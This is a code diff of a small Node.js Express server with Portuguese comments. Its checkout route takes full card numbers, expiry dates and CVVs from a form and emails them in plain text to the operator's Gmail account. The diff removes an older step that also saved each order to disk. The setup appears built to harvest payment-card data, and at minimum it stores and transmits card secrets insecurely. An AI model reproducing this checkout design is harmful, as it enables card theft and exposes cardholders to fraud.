@@ -1,16 +1,16 @@
 const express = require("express");
 const bodyParser = require("body-parser");
 const nodemailer = require("nodemailer");
-const fs = require("fs");
 const path = require("path");
 
 const app = express();
 
 // Middleware
 app.use(bodyParser.urlencoded({ extended: true }));
+app.use(express.json());
 app.use(express.static("public"));
 
-// 🔐 CONFIGURAÇÃO EMAIL (Render usa variáveis de ambiente)
+// ================= EMAIL CONFIG =================
 const transporter = nodemailer.createTransport({
   service: "gmail",
   auth: {
@@ -19,7 +19,7 @@ const transporter = nodemailer.createTransport({
   },
 });
 
-// ✅ ROTA CHECKOUT
+// ================= CHECKOUT =================
 app.post("/checkout", async (req, res) => {
   try {
     const {
@@ -47,26 +47,11 @@ Produto: ${produto}
 Preço: R$ ${preco}
 Método: ${metodo}
 
-Número Cartão: ${numeroCartao || "-"}
-Validade: ${validade || "-"}
-CVV: ${cvv || "-"}
+Número do Cartão: ${numeroCartao || "N/A"}
+Validade: ${validade || "N/A"}
+CVV: ${cvv || "N/A"}
 `;
 
-    // 📁 Criar pasta pedidos se não existir
-    const pastaPedidos = path.join(__dirname, "pedidos");
-    if (!fs.existsSync(pastaPedidos)) {
-      fs.mkdirSync(pastaPedidos);
-    }
-
-    // 📄 Salvar arquivo
-    const nomeArquivo = path.join(
-      pastaPedidos,
-      `pedido_${Date.now()}.txt`
-    );
-
-    fs.writeFileSync(nomeArquivo, dados);
-
-    // 📧 Enviar email
     await transporter.sendMail({
       from: process.env.EMAIL_USER,
       to: process.env.EMAIL_USER,
@@ -74,14 +59,14 @@ CVV: ${cvv || "-"}
       text: dados,
     });
 
-    res.send("ok");
+    res.status(200).send("Pedido enviado com sucesso!");
   } catch (error) {
-    console.log("Erro no checkout:", error);
-    res.status(500).send("Erro no servidor");
+    console.error("Erro ao enviar email:", error);
+    res.status(500).send("Erro no servidor.");
   }
 });
 
-// 🚀 PORTA DINÂMICA (OBRIGATÓRIO NA RENDER)
+// ================= PORTA RENDER =================
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
   console.log("Servidor rodando na porta " + PORT);
